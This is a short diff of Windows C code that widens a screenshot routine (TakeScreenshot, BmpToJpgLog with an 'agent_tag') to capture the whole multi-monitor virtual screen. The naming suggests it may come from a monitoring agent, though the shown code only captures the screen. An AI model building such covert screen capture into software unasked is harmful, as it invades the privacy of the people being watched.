@@ -243,8 +243,6 @@ PBYTE BmpToJpgLog(DWORD agent_tag, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *p
 }
 
 
-
-
 PBYTE TakeScreenshot(PULONG uOut)
 {
 	PBYTE pScreenShotBuffer = NULL;
@@ -292,9 +290,8 @@ PBYTE TakeScreenshot(PULONG uOut)
 		
 		wininfo.rcClient.left = 0;
 		wininfo.rcClient.top = 0;
-		wininfo.rcClient.right = GetSystemMetrics(SM_CXSCREEN);
-		wininfo.rcClient.bottom = GetSystemMetrics(SM_CYSCREEN);
-		
+		wininfo.rcClient.right = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+		wininfo.rcClient.bottom = GetSystemMetrics(SM_CYVIRTUALSCREEN);
 	} 
 	else
 	{
@@ -308,9 +305,8 @@ PBYTE TakeScreenshot(PULONG uOut)
 		}
 	}
 
-	
-	g_xscdim = GetSystemMetrics(SM_CXSCREEN);
-	g_yscdim = GetSystemMetrics(SM_CYSCREEN);
+	g_xscdim = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+	g_yscdim = GetSystemMetrics(SM_CYVIRTUALSCREEN);
 	if (wininfo.dwExStyle & WS_EX_LAYOUTRTL) 
 	{
 		winx = -(g_xscdim - wininfo.rcClient.right);
